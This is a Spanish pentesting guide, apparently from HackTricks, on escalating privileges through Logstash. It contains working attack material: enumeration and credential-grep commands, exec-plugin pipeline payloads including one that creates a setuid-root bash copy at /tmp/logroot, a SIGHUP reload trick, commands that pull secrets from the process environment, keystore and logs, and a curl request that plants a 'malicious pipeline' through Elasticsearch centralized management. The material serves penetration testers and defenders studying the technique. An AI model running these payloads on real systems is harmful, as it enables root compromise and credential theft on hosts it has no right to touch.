# Escalada de privilegios en Logstash

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash se utiliza para **recopilar, transformar y enviar registros** a través de un sistema conocido como **pipelines**. Estas pipelines están compuestas por las etapas **input**, **filter** y **output**. Surge un aspecto interesante cuando Logstash se ejecuta en una máquina comprometida.

### Configuración de pipelines

Las pipelines se configuran en el archivo **/etc/logstash/pipelines.yml**, que lista las ubicaciones de las configuraciones de las pipelines:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Este archivo revela dónde se encuentran los archivos **.conf**, que contienen las configuraciones de pipeline. Al emplear un **Elasticsearch output module**, es común que las **pipelines** incluyan **Elasticsearch credentials**, que a menudo poseen privilegios extensos debido a que Logstash necesita escribir datos en Elasticsearch. Los comodines en las rutas de configuración permiten a Logstash ejecutar todas las pipelines que coincidan en el directorio designado.

Si Logstash se inicia con `-f <directory>` en lugar de `pipelines.yml`, **todos los archivos dentro de ese directorio se concatenan en orden lexicográfico y se analizan como una única configuración**. Esto crea 2 implicaciones ofensivas:

- Un archivo añadido como `000-input.conf` o `zzz-output.conf` puede cambiar cómo se ensambla la pipeline final
- Un archivo malformado puede impedir la carga de toda la pipeline, por lo que valide los payloads cuidadosamente antes de confiar en la recarga automática

### Enumeración rápida en un host comprometido

En una máquina donde Logstash está instalado, inspeccione rápidamente:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
También comprueba si la API de monitorización local es accesible. Por defecto se enlaza en **127.0.0.1:9600**, lo cual suele ser suficiente una vez en el host:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Esto normalmente te da IDs de pipeline, detalles de runtime, y la confirmación de que tu pipeline modificado ha sido cargado.

Credentials recovered from Logstash commonly unlock **Elasticsearch**, so check [this other page about Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

Para intentar privilege escalation, primero identifica el usuario bajo el cual se está ejecutando el servicio Logstash, típicamente el usuario **logstash**. Asegúrate de cumplir **uno** de estos criterios:

- Tener **acceso de escritura** a un archivo **.conf** de pipeline **o**
- El archivo **/etc/logstash/pipelines.yml** usa un comodín, y puedes escribir en la carpeta objetivo

Adicionalmente, debe cumplirse **una** de estas condiciones:

- Capacidad para reiniciar el servicio Logstash **o**
- El archivo **/etc/logstash/logstash.yml** tiene **config.reload.automatic: true** establecido

Si existe un comodín en la configuración, crear un archivo que coincida con ese comodín permite la ejecución de comandos. Por ejemplo:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Aquí, **interval** determina la frecuencia de ejecución en segundos. En el ejemplo dado, el comando **whoami** se ejecuta cada 120 segundos, con su salida dirigida a **/tmp/output.log**.

Con **config.reload.automatic: true** en **/etc/logstash/logstash.yml**, Logstash detectará y aplicará automáticamente nuevas o modificadas configuraciones de pipeline sin necesidad de reinicio. Si no hay un comodín, todavía se pueden hacer modificaciones a las configuraciones existentes, pero se recomienda precaución para evitar interrupciones.

### Payloads de pipeline más fiables

El input plugin `exec` sigue funcionando en las versiones actuales y requiere ya sea un `interval` o un `schedule`. Se ejecuta haciendo **forking** de la JVM de Logstash, por lo que si la memoria es limitada tu payload puede fallar con `ENOMEM` en lugar de ejecutarse silenciosamente.

Un payload de privilege-escalation más práctico suele ser aquel que deja un artefacto duradero:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Si no tienes permisos para reiniciar pero puedes enviar una señal al proceso, Logstash también soporta una recarga desencadenada por **SIGHUP** en sistemas tipo Unix:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Ten en cuenta que no todos los plugins son reload-friendly. Por ejemplo, el input **stdin** impide la recarga automática, así que no asumas que `config.reload.automatic` siempre incorporará tus cambios.

### Robar secretos de Logstash

Antes de centrarte únicamente en la ejecución de código, recopila los datos a los que Logstash ya tiene acceso:

- Las credenciales en texto plano a menudo están hardcoded dentro de los outputs `elasticsearch {}`, `http_poller`, entradas JDBC o en configuraciones relacionadas con cloud
- Los ajustes seguros pueden residir en **`/etc/logstash/logstash.keystore`** o en otro directorio `path.settings`
- La contraseña del keystore se suministra frecuentemente a través de **`LOGSTASH_KEYSTORE_PASS`**, y las instalaciones basadas en paquetes comúnmente la toman desde **`/etc/sysconfig/logstash`**
- La expansión de variables de entorno con `${VAR}` se resuelve al iniciar Logstash, por lo que vale la pena inspeccionar el entorno del servicio

Comprobaciones útiles:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Esto también merece comprobarse porque **CVE-2023-46672** mostró que Logstash podía registrar información sensible en los logs bajo circunstancias específicas. En un post-exploitation host, los logs antiguos de Logstash y las entradas de `journald` pueden por tanto revelar credenciales incluso si la configuración actual hace referencia al keystore en lugar de almacenar secretos inline.

### Abuso de la gestión centralizada de pipelines

En algunos entornos, el host **no** depende en absoluto de archivos locales `.conf`. Si **`xpack.management.enabled: true`** está configurado, Logstash puede obtener pipelines gestionados de forma central desde Elasticsearch/Kibana, y tras habilitar este modo las configs locales de pipeline dejan de ser la fuente de la verdad.

Eso implica una vía de ataque diferente:

1. Recuperar credenciales de Elastic desde la configuración local de Logstash, el keystore, o los logs
2. Verificar si la cuenta tiene el privilegio de cluster `manage_logstash_pipelines`
3. Crear o reemplazar un pipeline gestionado de forma central para que el host Logstash ejecute tu payload en su siguiente intervalo de sondeo

La API de Elasticsearch utilizada para esta funcionalidad es:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Esto es especialmente útil cuando los archivos locales son de solo lectura pero Logstash ya está registrado para obtener pipelines de forma remota.

## Referencias

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
